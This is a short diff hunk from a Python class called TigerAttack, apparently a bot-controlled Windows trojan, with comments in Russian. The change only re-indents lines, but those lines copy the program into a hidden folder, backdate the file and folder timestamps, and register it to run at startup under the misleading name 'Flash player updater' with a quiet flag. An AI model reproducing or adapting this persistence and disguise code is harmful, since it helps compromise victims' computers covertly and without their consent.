@@ -49,15 +49,15 @@ class TigerAttack:
 		if not os.path.exists(copy2_path):
 			#os.makedirs(copy2_path)
 	
-		win32api.CopyFile(start_path, copy2_app)	   # Копируем приложение в папку с незамысловатым названием
+			win32api.CopyFile(start_path, copy2_app)	   # Копируем приложение в папку с незамысловатым названием
 
-		win32api.SetFileAttributes(copy2_path, 2)	   # Делаем папку невидимой
-		os.utime(copy2_app, (1282372620, 1282372620))  # Меняем дату создания папки
-		os.utime(copy2_path, (1282372620, 1282372620)) # и программы
+			win32api.SetFileAttributes(copy2_path, 2)	   # Делаем папку невидимой
+			os.utime(copy2_app, (1282372620, 1282372620))  # Меняем дату создания папки
+			os.utime(copy2_path, (1282372620, 1282372620)) # и программы
 
-		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
-		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
-		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра	
+			startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
+			key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
+			winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра	
 
 # Дальше идёт всё , что связано с взаимодействием человек-бот
 	def bot_handler(self, message):
